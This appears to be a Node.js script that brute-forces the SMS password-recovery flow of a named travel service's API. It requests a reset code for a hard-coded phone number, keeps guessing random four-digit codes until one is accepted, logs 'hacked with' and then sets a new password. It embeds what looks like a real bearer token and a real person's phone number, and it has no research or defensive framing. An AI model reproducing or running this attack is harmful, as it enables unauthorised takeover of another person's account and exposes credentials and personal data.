const express = require('express')
const app = express()
const request = require('request')
const randomize = require('randomatic')
const phone = '+7 (707) 435 05 07'
const cluster = require('cluster')
const numCPUs = require('os').cpus().length

// const bruteforce = setInterval( _ => {
//     if(hacked) {
//         clearInterval(bruteforce)
//     } else {
//         logon()
//     }
// }, 600000)

const recovery = () => {
    request({
        method: 'POST',
        url: 'https://api.aviataproject.com/auth/users/password-recovery',
        form: {
            phone: phone
        },
        headers: {
            'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJmNDlhZjU4Zi1jOTFmLTQ3ZGMtYWEzZi02OGIyNGY0OWFhNmQiLCJpc3MiOiJjNTg4OTNhMmVjZWQ0MTZlYTYwZDFmZTBlNTRhNTczMSIsImlhdCI6MTUyMDc1NTU0MiwiZXhwIjoyODQ1MjY3NTQyLCJjb25zdW1lciI6eyJpZCI6IjZmNTIxMmIwLWRlODMtNGE5Zi1hZjhhLTkxMmU1YmY5MDAyZiIsIm5hbWUiOiJhdmlhdGEua3oud2ViLmRlc2t0b3AifX0.QCfxPWnlHtdM9m0P-1BheSW7Lk-CqL8yhxT_exEmOMQ'
        }
    }, (err, res, body) => {
        console.log(body)
        confirm(randomize('0',4))
    })
}

recovery()
// changePassword()

const confirm = (code) => {

    request.post({
        url: 'https://api.aviataproject.com/auth/users/password-recovery/sms-confirmation',
        form: {
            phone: phone,
            code: code
        },
        headers: {
            'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJmNDlhZjU4Zi1jOTFmLTQ3ZGMtYWEzZi02OGIyNGY0OWFhNmQiLCJpc3MiOiJjNTg4OTNhMmVjZWQ0MTZlYTYwZDFmZTBlNTRhNTczMSIsImlhdCI6MTUyMDc1NTU0MiwiZXhwIjoyODQ1MjY3NTQyLCJjb25zdW1lciI6eyJpZCI6IjZmNTIxMmIwLWRlODMtNGE5Zi1hZjhhLTkxMmU1YmY5MDAyZiIsIm5hbWUiOiJhdmlhdGEua3oud2ViLmRlc2t0b3AifX0.QCfxPWnlHtdM9m0P-1BheSW7Lk-CqL8yhxT_exEmOMQ'
        }
    }, (err, res, body) => {

        if (res.statusCode == 400) {
            console.log(code)
            confirm(randomize('0',4))
        } else if (res.statusCode == 200){
            console.log('hacked with ', code, body)
            changePassword(code)
        }
    })
}

const changePassword = (code) => {
    request.post({
        url: 'https://api.aviataproject.com/auth/users/password-recovery/password',
        form: {
            phone: phone,
            code: code,
            password: 'NewPassword123'
        },
        headers: {
            'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJmNDlhZjU4Zi1jOTFmLTQ3ZGMtYWEzZi02OGIyNGY0OWFhNmQiLCJpc3MiOiJjNTg4OTNhMmVjZWQ0MTZlYTYwZDFmZTBlNTRhNTczMSIsImlhdCI6MTUyMDc1NTU0MiwiZXhwIjoyODQ1MjY3NTQyLCJjb25zdW1lciI6eyJpZCI6IjZmNTIxMmIwLWRlODMtNGE5Zi1hZjhhLTkxMmU1YmY5MDAyZiIsIm5hbWUiOiJhdmlhdGEua3oud2ViLmRlc2t0b3AifX0.QCfxPWnlHtdM9m0P-1BheSW7Lk-CqL8yhxT_exEmOMQ'
        }
    }, (err, res, body) => {
        console.log(body)
    })
}

// з

if (cluster.isMaster) {
    console.log(`Master ${process.pid} is running`);

    // Fork workers.
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`worker ${worker.process.pid} died`);
    });
} else {
    
    app.listen(3001)
    console.log(`Worker ${process.pid} started`);
}

